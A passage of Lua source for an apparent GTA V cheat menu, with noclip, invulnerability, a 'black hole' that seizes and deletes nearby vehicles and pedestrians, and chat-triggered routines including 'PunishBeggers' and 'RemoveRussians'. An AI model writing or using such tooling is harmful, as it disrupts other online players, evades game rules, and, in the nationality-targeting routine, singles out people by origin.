                                set.velocity(entity, dir.x * 200, dir.y * 200, dir.z * 200)
                            end
                        end
                    end
                    s.wait(300)
                end
            end
        end
        wait()
    end
end
function IsInVeh()
    local entself = get.ped_id()
    if get.player_in_veh(get.id()) then
        entself = get.veh(get.id())
    end
    return entself
end
function Noclip()
    if noclip == true then
        if not get.player_in_veh(get.id()) then
            local ped = get.ped_id()
            s.clear_task(ped)
        end
    end
    wait()
    if noclip == false then
        if get.player_in_veh(get.id()) then
            local Vehicle = get.veh(get.id())
            rqCtrl(Vehicle)
            set.freeze(Vehicle, false)
            set.collision(Vehicle, true, true)
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(Vehicle, 0.000001)
        else
            local ped = get.ped_id()
            set.freeze(ped, false)
            set.collision(ped, true, true)
            s.clear_task(ped)
        end
    end
    wait()
    local tick = 40
    while noclip == true do
        if noclip == false then
            break
        end
        local entself = IsInVeh()
        tick = tick + 1
        if tick > 10 and tick < 50 then
            if CONTROL.GET_CONTROL_NORMAL(0, C.INPUT_LOOK_UD) ~= 0 then
                tick = 0
            end
        end
        if tick > 60 and tick < 100 then
            if CONTROL.GET_CONTROL_NORMAL(0, C.INPUT_LOOK_UD) ~= 0 then
                tick = 0
            end
        end
        if CONTROL.GET_CONTROL_NORMAL(2, C.INPUT_LOOK_LR) ~= 0 then
            tick = 0
        end
        if tick == 50 then
            CONTROL.SET_CONTROL_NORMAL(0, C.INPUT_LOOK_UD, -0.3)
        end
        if tick == 100 then
            CONTROL.SET_CONTROL_NORMAL(0, C.INPUT_LOOK_UD, 0.3)
            tick = 0
        end
        get.control(entself)
        if ENTITY.IS_ENTITY_A_PED(entself) then
            if table_settings[10][2] then
                if 2725352035 == PED.GET_CURRENT_PED_WEAPON(entself) then
                    s.clear_task(entself)
                end
            else
                s.clear_task(entself)
            end
        end
        set.freeze(entself, true)
        set.collision(entself, false, true)
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(5)
        set.rotation(entself, rot.x, rot.y, rot.z, 5, true)
        local multiplier = 1
        if get.inputcontrol(0, C.INPUT_VEH_SUB_ASCEND) then
            multiplier = 10
        end
        if get.inputcontrol(0, C.INPUT_VEH_FLY_THROTTLE_UP) then
            local posW = get.offset_coords(entself, 0, 1 * multiplier, 0)
            set.coords_no_off(entself, posW.x, posW.y, posW.z)
        end
        if get.inputcontrol(0, C.INPUT_VEH_FLY_THROTTLE_DOWN) then
            local posS = get.offset_coords(entself, 0, -1 * multiplier, 0)
            set.coords_no_off(entself, posS.x, posS.y, posS.z)
        end
        if get.inputcontrol(0, C.INPUT_VEH_FLY_YAW_LEFT) then
            local posA = get.offset_coords(entself, -1 * multiplier, 0, 0)
            set.coords_no_off(entself, posA.x, posA.y, posA.z)
        end
        if get.inputcontrol(0, C.INPUT_VEH_FLY_YAW_RIGHT) then
            local posD = get.offset_coords(entself, 1 * multiplier, 0, 0)
            set.coords_no_off(entself, posD.x, posD.y, posD.z)
        end
        if get.inputcontrol(0, C.INPUT_VEH_PUSHBIKE_SPRINT) then
            local posUp = get.ent_coords(entself)
            set.coords_no_off(entself, posUp.x, posUp.y, posUp.z + 1 * multiplier)
        end
        if get.inputcontrol(0, C.INPUT_VEH_SUB_DESCEND) then
            local posDow = get.ent_coords(entself)
            set.coords_no_off(entself, posDow.x, posDow.y, posDow.z - 1 * multiplier)
        end
        wait()
    end
end
function DemiGod()
    local maxhealth = 328
    if god == true then
        maxhealth = PED.GET_PED_MAX_HEALTH(get.ped_id())
    end
    while god do
        local myped = get.ped_id()
        PED.SET_PED_MAX_HEALTH(myped, 10000)
        PED.SET_PED_HEALTH(myped, 10000)
        ENTITY.SET_ENTITY_PROOFS(myped, true, true, true, false, true, true, true, true)
        ENTITY.SET_ENTITY_MAX_HEALTH(myped, 10000)
        wait()
    end
    if god == false then
        s.wait(100)
        local myped = get.ped_id()
        PED.SET_PED_MAX_HEALTH(myped, maxhealth)
        PED.SET_PED_HEALTH(myped, maxhealth)
        ENTITY.SET_ENTITY_PROOFS(myped, false, false, false, false, false, false, false, false)
    end
end
function RocketBoost()
    while rocketboost == true do
        local veh = get.veh(get.id())
        if get.inputcontrol(0, C.INPUT_VEH_ROCKET_BOOST) then
            VEHICLE.SET_VEHICLE_ROCKET_BOOST_PERCENTAGE(veh, 100)
            if not VEHICLE.IS_VEHICLE_ROCKET_BOOST_ACTIVE(veh) then
                VEHICLE.SET_VEHICLE_ROCKET_BOOST_ACTIVE(veh, true)
            end
        else
            if VEHICLE.IS_VEHICLE_ROCKET_BOOST_ACTIVE(veh) then
                VEHICLE.SET_VEHICLE_ROCKET_BOOST_ACTIVE(veh, false)
            end
        end
        s.wait(10)
        if rocketboost == false then
            break
        end
    end
end
function ChatCommandsAll()
    if CommandsEnable == true then
        s.notify(text["Make sure that chat logger is on!"], 3000)
        readLog()
        s.wait(100)
    end
    while CommandsEnable == true do
        local size = fsize(file["XFLog"])
        if LogSize < size then
            local L = 0
            for line in io.lines(file["XFLog"]) do
                L = L + 1
                if #Lines < L then
                    local player, message = HandleChat(line, L)
                    if player ~= nil then
                        Command(player, message)
                    end
                end
                if CommandsEnable == false then
                    break
                end
            end
            LogSize = fsize(file["XFLog"])
        end
        s.wait(200)
    end
end
function ChatCommandsFriends()
    if FriendsOnly == true then
        s.notify(text["Make sure that chat logger is on!"], 3000)
        readLog()
        s.wait(100)
    end
    while FriendsOnly == true do
        local size = fsize(file["XFLog"])
        if CommandsEnable == true then
            goto continue
        end
        if LogSize < size then
            local L = 0
            for line in io.lines(file["XFLog"]) do
                L = L + 1
                if #Lines < L then
                    local player, message = HandleChat(line, L)
                    if player ~= nil then
                        Command(player, message)
                    end
                end
                if FriendsOnly == false then
                    break
                end
            end
            LogSize = fsize(file["XFLog"])
        end
        ::continue::
        s.wait(200)
    end
end
function RemoveRussia()
    if removerussians == true then
        s.notify(text["Make sure that chat logger is on!"], 3000)
        readLog()
        s.wait(100)
    end
    while removerussians == true do
        local size = fsize(file["XFLog"])
        if LogSize < size then
            local L = 0
            for line in io.lines(file["XFLog"]) do
                L = L + 1
                if #Lines < L then
                    local player, message = HandleChat(line, L)
                    if player ~= nil then
                        RemoveRussians(player, message)
                    end
                end
                if removerussians == false then
                    break
                end
            end
            LogSize = fsize(file["XFLog"])
        end
        s.wait(200)
    end
end
function SpamDetect()
    if spamdetection == true then
        s.notify(text["Make sure that chat logger is on!"], 3000)
        readLog()
        s.wait(100)
    end
    while spamdetection == true do
        local size = fsize(file["XFLog"])
        if LogSize < size then
            local L = 0
            for line in io.lines(file["XFLog"]) do
                L = L + 1
                if #Lines < L then
                    local player, message = HandleChat(line, L)
                    if player ~= nil then
                        SpamDetection(player, message)
                    end
                end
                if spamdetection == false then
                    break
                end
            end
            LogSize = fsize(file["XFLog"])
        end
        s.wait(200)
    end
end
function PunishBeg()
    if punishbeggers == true then
        s.notify(text["Make sure that chat logger is on!"], 3000)
        readLog()
        s.wait(100)
    end
    while punishbeggers == true do
        local size = fsize(file["XFLog"])
        if LogSize < size then
            local L = 0
            for line in io.lines(file["XFLog"]) do
                L = L + 1
                if #Lines < L then
                    local player, message = HandleChat(line, L)
                    if player ~= nil then
                        PunishBeggers(player, message)
                    end
                end
                if punishbeggers == false then
                    break
                end
            end
            LogSize = fsize(file["XFLog"])
        end
        s.wait(200)
    end
end
function SE_block(sender, count, args)
    if table_settings[2][2] == true then
        if args[1] == -1704141512 then
            log(
                "Xhax Upgrade",
                "Game Event Blocked | From: " .. get.name(sender) .. " | Type: Script | Transaction Error"
            )
            s.notify("Game Event Blocked | From: " .. get.name(sender) .. " | Type: Script | Transaction Error")
            return false
        end
    end
    return true
end
function bl_hole()
    local black_hole, hole = nil, nil
    rqModel(1530167798)
    while blackhole == true do
        if not blackholeinf[7] then
            if black_hole == nil then
                hole = set.obj(1530167798, blackholeinf[1], blackholeinf[2], blackholeinf[3], false, false, false)
                set.freeze(hole, true)
                set.collision(hole, false, true)
                black_hole = true
            end
            if not s.ent_exist(hole) then
                black_hole = nil
            else
                set.coords_no_off(hole, blackholeinf[1], blackholeinf[2], blackholeinf[3])
            end
        else
            delEnt(hole)
            black_hole = nil
        end
        local vehicle = getAllVehs()
        wait()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if vehicle[i] ~= getPersonalVeh() then
                    if s.has_control(vehicle[i]) then
                        local distance =
                            getDistanceToCoord(vehicle[i], blackholeinf[1], blackholeinf[2], blackholeinf[3])
                        if distance < 6 then
                            set.freeze(vehicle[i], true)
                            set.freeze(vehicle[i], false)
                            if blackholeinf[6] == true then
                                delEnt(vehicle[i])
                            end
                        else
                            doOscillateToCoord(
                                vehicle[i],
                                blackholeinf[1],
                                blackholeinf[2],
                                blackholeinf[3],
                                blackholeinf[5]
                            )
                        end
                    end
                end
            end
        end
        wait()
        local peds = getAllPeds()
        get_control_of_entities(peds)
        wait()
        for i = 1, #peds do
            if peds[i] ~= get.ped_id() then
                if s.has_control(peds[i]) then
                    local distance = getDistanceToCoord(peds[i], blackholeinf[1], blackholeinf[2], blackholeinf[3])
                    if distance < 6 then
                        set.freeze(peds[i], true)
                        set.freeze(peds[i], false)
                        if blackholeinf[6] == true then
                            delEnt(peds[i])
                        end
                    else
                        doOscillateToCoord(peds[i], blackholeinf[1], blackholeinf[2], blackholeinf[3], blackholeinf[5])
                    end
                end
            end
        end
        wait()
    end
    if blackhole == false then
        delEnt(hole)
    end
end
function hkpop()
    local sc = get_display_size()
    set_next_window_pos(vec2(sc.x / 2 - 132, sc.y / 2 - 40))
    set_next_window_size(vec2(254, 80))
    open_popup("RegHotkey")
    if begin_popup("RegHotkey", 1 << 6) then
        new_line()
        add_text("\t\t\tPRESS ANY KEY")
        end_popup()
    end
end
function playanim()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        set_next_window_size(vec2(400, 500))
        if begin_window(text["Animations"], 1 << 6) then
            if begin_tab_bar("anims") then
                add_button(
                    text["Stop Animation"],
                    vec2(375, 25),
                    function()
                        s.clear_task(get.ped_id())
                    end
                )
                if begin_tab_item(text["Options"]) then
                    separator()
                    add_text(text["Blend-In Speed:"])
                    same_line()
                    add_button(
                        " -\n\nbi",
                        vec2(25, 25),
                        function()
                            Animopt[1] = Animopt[1] - 0.1
                        end
                    )
                    same_line()
                    add_button(
                        " +\n\nbi",
                        vec2(25, 25),
                        function()
                            Animopt[1] = Animopt[1] + 0.1
                        end
                    )
                    same_line()
                    add_text(string.format("%.1f", tostring(Animopt[1])))
                    add_text(text["Blend-Out Speed:"])
                    same_line()
                    add_button(
                        " -\n\nbo",
                        vec2(25, 25),
                        function()
                            Animopt[2] = Animopt[2] - 0.1
                        end
                    )
                    same_line()
                    add_button(
                        " +\n\nbo",
                        vec2(25, 25),
                        function()
                            Animopt[2] = Animopt[2] + 0.1
                        end
                    )
                    same_line()
                    add_text(string.format("%.1f", tostring(Animopt[2])))
                    add_text(text["Duration (ms):"])
                    same_line()
                    add_button(
                        " -\n\ndu",
                        vec2(25, 25),
                        function()
                            local mult = 1
                            if get.inputcontrol(0, C.INPUT_FRONTEND_RS) then
                                mult = 1000
                            end
                            Animopt[3] = Animopt[3] - 1 * mult
                            if Animopt[3] < -1 then
                                Animopt[3] = -1
                            end
                        end
                    )
                    same_line()
                    add_button(
                        " +\n\ndu",
                        vec2(25, 25),
                        function()
                            local mult = 1
                            if get.inputcontrol(0, C.INPUT_FRONTEND_RS) then
                                mult = 1000
                            end
                            Animopt[3] = Animopt[3] + 1 * mult
                        end
                    )
                    same_line()
                    add_text(tostring(Animopt[3]))
                    add_text(text["Playback Rate:"])
                    same_line()
                    add_button(
                        " -\n\npl",
                        vec2(25, 25),
                        function()
                            Animopt[4] = Animopt[4] - 0.1
                            if Animopt[4] < 0 then
                                Animopt[4] = 0.0
                            end
                        end
                    )
                    same_line()
                    add_button(
                        " +\n\npl",
                        vec2(25, 25),
                        function()
                            Animopt[4] = Animopt[4] + 0.1
                            if Animopt[4] > 1 then
                                Animopt[4] = 1.0
                            end
                        end
                    )
                    same_line()
                    add_text(string.format("%.1f", tostring(Animopt[4])))
                    separator()
                    add_text(text["Anim Flags:"])
                    add_checkbox(
                        text["Loop"],
                        function(on)
                            if on then
                                Animflag[1] = anim_flag.Loop
                            else
                                Animflag[1] = 0
                            end
                        end
                    )
                    add_checkbox(
                        text["StopOnLastFrame"],
                        function(on)
                            if on then
                                Animflag[2] = anim_flag.StopOnLastFrame
                            else
                                Animflag[2] = 0
                            end
                        end
                    )
                    add_checkbox(
                        text["OnlyAnimateUpperBody"],
                        function(on)
                            if on then
                                Animflag[3] = anim_flag.OnlyAnimateUpperBody
                            else
                                Animflag[3] = 0
                            end
                        end
                    )
                    add_checkbox(
                        text["AllowPlayerControl"],
                        function(on)
                            if on then
                                Animflag[4] = anim_flag.AllowPlayerControl
                            else
                                Animflag[4] = 0
                            end
                        end
                    )
                    add_checkbox(
                        text["Cancellable"],
                        function(on)
                            if on then
                                Animflag[5] = anim_flag.Cancellable
                            else
                                Animflag[5] = 0
                            end
                        end
                    )
                    separator()
                    add_checkbox(
                        text["Lock Position"],
                        function(on)
                            Animflag[6] = on
                        end
                    )
                    end_tab_item()
                end
                if begin_tab_item(text["All Anims"]) then
                    add_input_string_with_hint(
                        " ",
                        text["[Search by Name]"],
                        function(string)
                            searchanim = string
                            if #searchanim > 2 then
                                animresult = searchengine(searchanim, animationName, false)
                            end
                        end
                    )
                    ishovered7 = is_item_hovered()
                    add_input_string_with_hint(
                        "  ",
                        text["[Search by Dictionary]"],
                        function(string)
                            searchanim = string
                            if #searchanim > 2 then
                                animresult = searchengine(searchanim, animationDict, false)
                            end
                        end
                    )
                    ishovered8 = is_item_hovered()
                    if searchanim ~= nil and searchanim ~= "" and #searchanim > 2 then
                        if animresult ~= nil then
                            for i = 1, #animresult do
                                if
                                    begin_menu(
                                        Animations[animresult[i]][1] .. " | " .. Animations[animresult[i]][2],
                                        true
                                    )
                                 then
                                    add_button(
                                        text["Play"] .. "\n\n " .. i,
                                        vec2(200, 23),
                                        function()
                                            if playinganim then
                                                return
                                            end
                                            PlayAnim(
                                                get.ped_id(),
                                                Animations[animresult[i]][1],
                                                Animations[animresult[i]][2],
                                                Animopt[1],
                                                Animopt[2],
                                                Animopt[3],
                                                Animflag[1] | Animflag[2] | Animflag[3] | Animflag[4] | Animflag[5],
                                                Animopt[4],
                                                Animflag[6]
                                            )
                                        end
                                    )
                                    add_button(
                                        text["Play On All Peds"] .. "\n\n " .. i,
                                        vec2(200, 23),
                                        function()
                                            if playinganim then
                                                return
                                            end
                                            get_control_of_entities(getAllPeds(500, true))
                                            for _, ped in ipairs(getAllPeds(500, true)) do
                                                s.clear_task(ped)
                                                PlayAnim(
                                                    ped,
                                                    Animations[animresult[i]][1],
                                                    Animations[animresult[i]][2],
                                                    Animopt[1],
                                                    Animopt[2],
                                                    Animopt[3],
                                                    Animflag[1] | Animflag[2] | Animflag[3] | Animflag[4] | Animflag[5],
                                                    Animopt[4],
                                                    Animflag[6]
                                                )
                                            end
                                        end
                                    )
                                    add_button(
                                        text["Add To Favourites"] .. "\n\n" .. i,
                                        vec2(200, 23),
                                        function()
                                            AddToFavAnim(Animations[animresult[i]][1], Animations[animresult[i]][2])
                                        end
                                    )
                                    end_menu()
                                end
                            end
                        else
                            add_text(text["No results found!"])
                        end
                    else
                        for i = 1, #premadeanims do
                            if begin_menu(premadeanims[i][1], true) then
                                add_button(
                                    text["Play"] .. "\n\n " .. i,
                                    vec2(200, 23),
                                    function()
                                        if playinganim then
                                            return
                                        end
                                        PlayAnim(
                                            get.ped_id(),
                                            premadeanims[i][2],
                                            premadeanims[i][3],
                                            Animopt[1],
                                            Animopt[2],
                                            Animopt[3],
                                            Animflag[1] | Animflag[2] | Animflag[3] | Animflag[4] | Animflag[5],
                                            Animopt[4],
                                            Animflag[6]
                                        )
                                    end
                                )
                                add_button(
                                    text["Play On All Peds"] .. "\n\n " .. i,
                                    vec2(200, 23),
                                    function()
                                        if playinganim then
                                            return
                                        end
                                        get_control_of_entities(getAllPeds(500, true))
                                        for _, ped in ipairs(getAllPeds(500, true)) do
                                            s.clear_task(ped)
                                            PlayAnim(
                                                ped,
                                                premadeanims[i][2],
                                                premadeanims[i][3],
                                                Animopt[1],
                                                Animopt[2],
                                                Animopt[3],
                                                Animflag[1] | Animflag[2] | Animflag[3] | Animflag[4] | Animflag[5],
                                                Animopt[4],
                                                Animflag[6]
                                            )
                                        end
                                    end
                                )
                                add_button(
                                    text["Add To Favourites"] .. "\n\n" .. i,
                                    vec2(200, 23),
                                    function()
                                        AddToFavAnim(premadeanims[i][2], premadeanims[i][3])
                                    end
                                )
                                end_menu()
                            end
                        end
                    end
                    end_tab_item()
                end
                if begin_tab_item(text["Favourites"]) then
                    for i = 1, #FavAnims do
                        if begin_menu(FavAnims[i][1] .. " | " .. FavAnims[i][2], true) then
                            add_button(
                                text["Play"] .. "\n\n" .. i,
                                vec2(200, 23),
                                function()
                                    if playinganim then
                                        return
                                    end
                                    PlayAnim(
                                        get.ped_id(),
                                        FavAnims[i][1],
                                        FavAnims[i][2],
                                        Animopt[1],
                                        Animopt[2],
                                        Animopt[3],
                                        Animflag[1] | Animflag[2] | Animflag[3] | Animflag[4] | Animflag[5],
                                        Animopt[4],
                                        Animflag[6]
                                    )
                                end
                            )
                            add_button(
                                text["Play On All Peds"] .. "\n\n" .. i,
                                vec2(200, 23),
                                function()
                                    if playinganim then
                                        return
                                    end
                                    get_control_of_entities(getAllPeds(500, true))
                                    for _, ped in ipairs(getAllPeds(500, true)) do
                                        s.clear_task(ped)
                                        PlayAnim(
                                            ped,
                                            FavAnims[i][1],
                                            FavAnims[i][2],
                                            Animopt[1],
                                            Animopt[2],
                                            Animopt[3],
                                            Animflag[1] | Animflag[2] | Animflag[3] | Animflag[4] | Animflag[5],
                                            Animopt[4],
                                            Animflag[6]
                                        )
                                    end
                                end
                            )
                            add_button(
                                text["Delete"] .. "\n\n" .. i,
                                vec2(200, 23),
                                function()
                                    RemoveFavAnim(i)
                                end
                            )
                            end_menu()
                        end
                    end
                    end_tab_item()
                end
                if begin_tab_item(text["Scenarios"]) then
                    for i = 1, #scenario do
                        if begin_menu(scenario[i][1], true) then
                            add_button(
                                text["Play"] .. "\n\n\n" .. i,
                                vec2(200, 23),
                                function()
                                    PlayScenario(get.ped_id(), scenario[i][2])
                                end
                            )
                            end_menu()
                        end
                    end
                    end_tab_item()
                end
                end_tab_bar()
            end
            end_window()
        end
        pop_style_var(1)
    end
end
function blackhole_window()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        if begin_window(text["Black Hole"], 1 << 6) then
            add_button(
                text["Bring To Self"],
                vec2(300, 25),
                function()
                    local bl = get.coords(get.id())
                    blackholeinf[1] = floor(bl.x)
                    blackholeinf[2] = floor(bl.y)
                    blackholeinf[3] = floor(bl.z + 20)
                end
            )
            add_checkbox(
                text["Attach To Self"],
                function(on)
                    blackholeinf[7] = on
                end
            )
            same_line()
            add_text("| Not very good idea...")
            separator()
            add_text(text["Multiplier:"])
            same_line()
            add_button(
                " -\n\nm",
                vec2(25, 25),
                function()
                    blackholeinf[4] = blackholeinf[4] * 0.1
                    if blackholeinf[4] < 0.0001 then
                        blackholeinf[4] = 0.0001
                    end
                end
            )
            same_line()
            add_button(
                " +\n\nm",
                vec2(25, 25),
                function()
                    blackholeinf[4] = blackholeinf[4] * 10
                    if blackholeinf[4] > 100 then
                        blackholeinf[4] = 100
                    end
                end
            )
            same_line()
            add_text(string.format("%.4f", tostring(blackholeinf[4])))
            add_text("X:\t\t\t")
            same_line()
            add_button(
                " -\n\nx",
                vec2(25, 25),
                function()
                    blackholeinf[1] = blackholeinf[1] - blackholeinf[4]
                end
            )
            same_line()
            add_button(
                " +\n\nx",
                vec2(25, 25),
                function()
                    blackholeinf[1] = blackholeinf[1] + blackholeinf[4]
                end
            )
            same_line()
            add_text(string.format("%.4f", tostring(blackholeinf[1])))
            add_text("Y:\t\t\t")
            same_line()
            add_button(
                " -\n\ny",
                vec2(25, 25),
                function()
                    blackholeinf[2] = blackholeinf[2] - blackholeinf[4]
                end
            )
            same_line()
            add_button(
                " +\n\ny",
                vec2(25, 25),
                function()
                    blackholeinf[2] = blackholeinf[2] + blackholeinf[4]
                end
            )
            same_line()
            add_text(string.format("%.4f", tostring(blackholeinf[2])))
            add_text("Z:\t\t\t")
            same_line()
            add_button(
                " -\n\nz",
                vec2(25, 25),
                function()
                    blackholeinf[3] = blackholeinf[3] - blackholeinf[4]
                end
            )
            same_line()
            add_button(
                " +\n\nz",
                vec2(25, 25),
                function()
                    blackholeinf[3] = blackholeinf[3] + blackholeinf[4]
                end
            )
            same_line()
            add_text(string.format("%.4f", tostring(blackholeinf[3])))
            separator()
            add_text(text["Force:"])
            same_line()
            add_button(
                " -\n\nf",
                vec2(25, 25),
                function()
                    blackholeinf[5] = blackholeinf[5] - 1
                    if blackholeinf[5] < 1 then
                        blackholeinf[5] = 1
                    end
                end
            )
            same_line()
            add_button(
                " +\n\nf",
                vec2(25, 25),
                function()
                    blackholeinf[5] = blackholeinf[5] + 1
                    if blackholeinf[5] > 3 then
                        blackholeinf[5] = 3
                    end
                end
            )
            local forcetype = text["Low"]
            if blackholeinf[5] == 2 then
                forcetype = text["Medium"]
            end
            if blackholeinf[5] == 3 then
                forcetype = text["High"]
            end
            same_line()
            add_text(forcetype)
            separator()
            add_checkbox(
                text["Suck In"],
                function(on)
                    blackholeinf[6] = on
                end
            )
            separator()
            add_checkbox(
                text["Enable Black Hole"],
                function(on)
                    blackhole = on
                    bl_hole(blackholeinf[6])
                end
            )
            end_window()
        end
        pop_style_var(1)
    end
end
function weapon_window()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        if begin_window(text["Weapon Manager"], 1 << 6) then
            if begin_tab_bar("weapons") then
                if begin_tab_item(text["Weapons"]) then
                    for k, v in pairs(Weapons) do
                        if begin_menu(k, true) then
                            for i, e in pairs(v) do
                                if begin_menu(i, true) then
                                    add_button(
                                        text["Add Weapon"] .. "\n\n" .. i,
                                        vec2(165, 23),
                                        function()
                                            AddWeapon(e["Hash"])
                                        end
                                    )
                                    add_button(
                                        text["Remove Weapon"] .. "\n\n" .. i,
                                        vec2(165, 23),
                                        function()
                                            RemoveWeapon(e["Hash"])
                                        end
                                    )
                                    if e["Components"] then
                                        add_text(text["Components"])
                                        for j, x in pairs(e["Components"]) do
                                            if begin_menu(j, true) then
                                                add_button(
                                                    text["Add Component"] .. "\n\n" .. j .. e["Hash"],
                                                    vec2(165, 23),
                                                    function()
                                                        AddComponent(e["Hash"], joaat(x))
                                                    end
                                                )
                                                add_button(
                                                    text["Remove Component"] .. "\n\n" .. j .. e["Hash"],
                                                    vec2(165, 23),
                                                    function()
                                                        RemoveComponent(e["Hash"], joaat(x))
                                                    end
                                                )
                                                end_menu()
                                            end
                                        end
                                    end
                                    end_menu()
                                end
                            end
                            end_menu()
                        end
                    end
                    separator()
                    add_button(
                        text["Give All Weapons"],
                        vec2(165, 23),
                        function()
                            for k, v in pairs(Weapons) do
                                for i, e in pairs(v) do
                                    AddWeapon(e["Hash"])
                                end
                            end
                        end
                    )
                    add_button(
                        text["Remove All Weapons"],
                        vec2(165, 23),
                        function()
                            WEAPON.REMOVE_ALL_PED_WEAPONS(get.ped_id(), true)
                        end
                    )
                    add_button(
                        text["Give All Components"],
                        vec2(165, 23),
                        function()
                            for k, v in pairs(Weapons) do
                                for i, e in pairs(v) do
                                    for j = 1, #weaponattachment do
                                        AddComponent(e["Hash"], weaponattachment[j])
                                    end
                                end
                            end
                        end
                    )
                    end_tab_item()
                end
                if begin_tab_item(text["Loadouts"]) then
                    add_input_string_with_hint(
                        "   ",
                        text["[Enter Name Here]"],
                        function(string)
                            loadoutname = string
                        end
                    )
                    ishovered6 = is_item_hovered()
                    add_button(
                        text["Save Loadout"],
                        vec2(150, 23),
                        function()
                            SaveWeapons(loadoutname)
                        end
                    )
                    same_line()
                    add_button(
                        text["Open Loadouts"],
                        vec2(150, 23),
                        function()
                            open_file(path["WeaponLoadout"])
                        end
                    )
                    separator()
                    add_text(text["Loadouts"])
                    separator()
                    for i = 1, #loadouts do
                        if begin_menu(loadouts[i], true) then
                            add_button(
                                text["Load"] .. "\n\n" .. i,
                                vec2(165, 23),
                                function()
                                    LoadWeapons(loadouts[i])
                                end
                            )
                            add_button(
                                text["Delete"] .. "\n\n" .. i,
                                vec2(165, 23),
                                function()
                                    RemoveWeapons(i, loadouts[i])
                                end
                            )
                            add_button(
                                text["Rename"] .. "\n\n" .. i,
                                vec2(165, 23),
                                function()
                                    RenameWeapons(i, loadouts[i], loadoutname)
                                end
                            )
                            end_menu()
                        end
                    end
                    end_tab_item()
                end
                end_tab_bar()
            end
            end_window()
        end
        pop_style_var(1)
    end
end
function outfits_window()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        if searchstr == nil or searchstr == "" then
            if #svoutfits.name > 20 then
                set_next_window_size(vec2(297, 600))
            end
        else
            if outfitresults ~= nil then
                if #outfitresults > 20 then
                    set_next_window_size(vec2(297, 600))
                end
            end
        end
        if begin_window(text["Saved Outfits"], 1 << 6) then
            add_input_string_with_hint(
                "    ",
                text["[Enter Name Here]"],
                function(string)
                    outfitname = string
                end
            )
            ishovered1 = is_item_hovered()
            add_button(
                text["Save Current Outfit"],
                vec2(265, 23),
                function()
                    SaveOutfit(outfitname)
                end
            )
            separator()
            add_input_string_with_hint(
                "     ",
                text["[Search Outfits]"],
                function(string)
                    searchstr = string
                    outfitresults = searchengine(searchstr, svoutfits.name, true)
                end
            )
            ishovered2 = is_item_hovered()
            separator()
            for i = 1, #svoutfits.name do
                if searchstr == nil or searchstr == "" then
                    if begin_menu(svoutfits.name[i], true) then
                        add_button(
                            text["Apply"] .. "\n\n" .. i,
                            vec2(105, 23),
                            function()
                                apply_outfit(i)
                            end
                        )
                        add_button(
                            text["Rename"] .. "\n\n" .. i,
                            vec2(105, 23),
                            function()
                                rename_outfit(i)
                            end
                        )
                        add_button(
                            text["Overwrite"] .. "\n\n" .. i,
                            vec2(105, 23),
                            function()
                                overwriteoutfit(i, svoutfits.name[i])
                            end
                        )
                        add_button(
                            text["Delete"] .. "\n\n" .. i,
                            vec2(105, 23),
                            function()
                                delete_outfit(i)
                            end
                        )
                        end_menu()
                    end
                else
                    if outfitresults ~= nil then
                        for j = 1, #outfitresults do
                            if i == outfitresults[j] then
                                if begin_menu(svoutfits.name[i], true) then
                                    add_button(
                                        text["Apply"] .. "\n\n" .. i,
                                        vec2(105, 23),
                                        function()
                                            apply_outfit(i)
                                        end
                                    )
                                    add_button(
                                        text["Rename"] .. "\n\n" .. i,
                                        vec2(105, 23),
                                        function()
                                            rename_outfit(i)
                                        end
                                    )
                                    add_button(
                                        text["Overwrite"] .. "\n\n" .. i,
                                        vec2(105, 23),
                                        function()
                                            overwriteoutfit(i, svoutfits.name[i])
                                        end
                                    )
                                    add_button(
                                        text["Delete"] .. "\n\n" .. i,
                                        vec2(105, 23),
                                        function()
                                            delete_outfit(i)
                                        end
                                    )
                                    end_menu()
                                end
                            end
                        end
                    else
                        if i == 1 then
                            add_text(text["No results found!"])
                        end
                    end
                end
            end
            separator()
            add_button(
                text["Open Outfits Folder"],
                vec2(265, 23),
                function()
                    open_file(path["Outfits"])
                end
            )
            add_button(
                text["Refresh Outfits"],
                vec2(265, 23),
                function()
                    ReloadOutfits()
                end
            )
            end_window()
        end
        pop_style_var(1)
    end
end
function outfiteditor_window()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        if begin_window(text["Outfit Editor"], 1 << 6) then
            add_checkbox(
                text["Skip Disappearing Components"],
                function(on)
                    skipcomp = on
                end
            )
            separator()
            for i = 1, #outfiteditor do
                if begin_menu(outfiteditor[i][1], true) --[[component]] then
                    same_line()
                    add_button(
                        " <\n\n" .. i,
                        vec2(23, 23),
                        function()
                            var[i] = get.drawable(get.ped_id(), i)
                            varmax[i] = get.drawable_num(get.ped_id(), i)
                            varmax[i] = varmax[i] - 1
                            var[i] = var[i] - 1
                            if
                                skipcomp and
                                    (PED.IS_PED_MODEL(get.ped_id(), female) or PED.IS_PED_MODEL(get.ped_id(), male))
                             then
                                if i == 1 and var[i] == 51 then
                                    var[i] = var[i] - 1
                                end
                                if i == 1 and var[i] == 90 then
                                    var[i] = var[i] - 1
                                end
                                if i == 1 and var[i] == 107 then
                                    var[i] = var[i] - 1
                                end
                                if i == 1 and var[i] == 111 then
                                    var[i] = var[i] - 1
                                end
                                if i == 1 and var[i] == 116 then
                                    var[i] = var[i] - 1
                                end
                                if i == 1 and var[i] == 169 then
                                    var[i] = var[i] - 1
                                end
                                if i == 1 and var[i] == 187 then
                                    var[i] = var[i] - 1
                                end
                                if i == 5 and var[i] == 8 then
                                    var[i] = var[i] - 1
                                end
                            end
                            if
                                i == 1 and var[i] == 120 and
                                    (PED.IS_PED_MODEL(get.ped_id(), female) or PED.IS_PED_MODEL(get.ped_id(), male))
                             then
                                var[i] = var[i] - 1
                            end
                            if var[i] < 0 then
                                var[i] = varmax[i]
                            end
                            if PED.IS_PED_MODEL(get.ped_id(), female) then
                                if i == 4 and var[i] == 151 then
                                    var[i] = var[i] - 1
                                end
                                if i == 6 and var[i] == 106 then
                                    var[i] = var[i] - 1
                                end
                                if i == 8 and var[i] == 234 then
                                    var[i] = var[i] - 1
                                end
                                if i == 11 and var[i] == 415 then
                                    var[i] = var[i] - 1
                                end
                            elseif PED.IS_PED_MODEL(get.ped_id(), male) then
